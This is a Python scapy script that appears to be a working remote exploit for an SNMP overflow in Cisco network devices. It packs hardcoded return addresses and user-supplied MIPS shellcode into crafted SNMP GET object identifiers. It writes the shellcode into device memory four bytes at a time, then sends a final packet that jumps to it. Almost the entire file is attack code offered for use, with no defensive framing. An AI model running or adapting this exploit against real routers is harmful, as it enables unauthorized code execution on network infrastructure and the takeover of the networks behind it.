from scapy.all import *
from time import sleep
from struct import pack, unpack
import random
import argparse
import sys
from termcolor import colored


try:
    cs = __import__('capstone')
except ImportError:
    pass

def bin2oid(buf):
    return ''.join(['.' + str(unpack('B', x)[0]) for x in buf])

def shift(s, offset):
    res = pack('>I', unpack('>I', s)[0] + offset)
    return res


alps_oid = '1.3.6.1.4.1.9.9.95.1.3.1.1.7.108.39.84.85.195.249.106.59.210.37.23.42.103.182.75.232.81{0}{1}{2}{3}{4}{5}{6}{7}.14.167.142.47.118.77.96.179.109.211.170.27.243.88.157.50{8}{9}.35.27.203.165.44.25.83.68.39.22.219.77.32.38.6.115{10}{11}.11.187.147.166.116.171.114.126.109.248.144.111.30'
shellcode_start = b'\x80\x00\xf0\x00'  # Shellcode starting point

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("host", type=str, help="host IP")
    parser.add_argument("community", type=str, help="community string")
    parser.add_argument("shellcode", action='store', type=str, help='shellcode to run (in hex)')
    args = parser.parse_args()

    # Convert hex shellcode to binary
    sh_buf = bytes.fromhex(args.shellcode.replace(' ', ''))
    print('Writing shellcode to 0x{}'.format(shellcode_start.hex()))
    
    if 'capstone' in sys.modules:
        md = cs.Cs(cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS32 | cs.CS_MODE_BIG_ENDIAN)

    for k, sh_dword in enumerate([sh_buf[i:i+4] for i in range(0, len(sh_buf), 4)]):
        s0 = bin2oid(sh_dword)  # shellcode dword
        s1 = bin2oid(b'\x00\x00\x00\x00') 
        s2 = bin2oid(b'\xBF\xC5\xB7\xDC')
        s3 = bin2oid(b'\x00\x00\x00\x00')
        s4 = bin2oid(b'\x00\x00\x00\x00')
        s5 = bin2oid(b'\x00\x00\x00\x00')
        s6 = bin2oid(b'\x00\x00\x00\x00')
        ra = bin2oid(b'\xbf\xc2\x2f\x60')  # Return address
        s0_2 = bin2oid(shift(shellcode_start, k * 4))
        ra_2 = bin2oid(b'\xbf\xc7\x08\x60')
        s0_3 = bin2oid(b'\x00\x00\x00\x00')
        ra_3 = bin2oid(b'\xBF\xC3\x86\xA0')
        
        payload = alps_oid.format(s0, s1, s2, s3, s4, s5, s6, ra, s0_2, ra_2, s0_3, ra_3)
        
        # Send SNMP packet
        send(IP(dst=args.host) / UDP(sport=161, dport=161) / SNMP(community=args.community, PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))

        cur_addr = unpack(">I", shift(shellcode_start, k * 4 + 0xa4))[0]
        if 'capstone' in sys.modules:
            for i in md.disasm(sh_dword, cur_addr):
                color = 'green'
                print("0x%x:\t%s\t%s\t%s" % (i.address, sh_dword.hex(), colored(i.mnemonic, color), colored(i.op_str, color)))
        else:
            print("0x%x:\t%s" % (cur_addr, sh_dword.hex()))
            
        sleep(1)

    ans = input("Jump to shellcode? [yes]: ")

    if ans.lower() == 'yes':
        ra = bin2oid(shift(shellcode_start, 0xa4))  # Return address to jump to shellcode
        zero = bin2oid(b'\x00\x00\x00\x00')
        payload = alps_oid.format(zero, zero, zero, zero, zero, zero, zero, ra, zero, zero, zero, zero)
        send(IP(dst=args.host) / UDP(sport=161, dport=161) / SNMP(community=args.community, PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))
        print('Jump taken!')
